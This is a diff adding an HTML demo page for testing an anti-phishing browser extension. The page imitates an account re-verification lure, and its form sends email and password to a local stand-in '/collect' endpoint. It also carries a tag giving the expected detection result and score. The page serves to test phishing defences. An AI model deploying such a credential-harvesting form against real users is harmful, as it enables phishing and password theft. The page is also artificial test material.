@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Account verification — demo</title>
+    <style>
+      body { font: 16px/1.6 system-ui, sans-serif; max-width: 560px; margin: 80px auto; padding: 0 20px; }
+      .tag { display: inline-block; background: #fff1d6; color: #8a5a00; border-radius: 999px; padding: 3px 10px; font-size: 12px; }
+      .card { border: 1px solid #e4ded2; border-radius: 14px; padding: 22px; margin-top: 20px; }
+      form { display: grid; gap: 10px; margin-top: 14px; }
+      input, button { font: inherit; padding: 10px 12px; border-radius: 8px; border: 1px solid #ccc; }
+      button { background: #123a6b; color: #fff; border-color: #123a6b; cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <span class="tag">expected: orange banner + cross-domain form blocked (score ≈ 0.55)</span>
+    <h1>Verify your account</h1>
+    <div class="card">
+      <p><b>Your session expires in 24 hours.</b> Re-enter your details to keep access.</p>
+      <!-- The action points at another host on purpose: the banner is up, so
+           the content script blocks this submit and explains why. -->
+      <form action="http://127.0.0.1:8790/collect" method="post">
+        <input name="email" type="email" placeholder="Email address" />
+        <input name="password" type="password" placeholder="Password" />
+        <button type="submit">Re-verify now</button>
+      </form>
+      <p style="font-size:12px;color:#777">If the button does nothing, Olfa stopped your password from leaving this page.</p>
+    </div>
+    <p><a href="/demo/high.html">Next: the high-risk page →</a></p>
+  </body>
+</html>
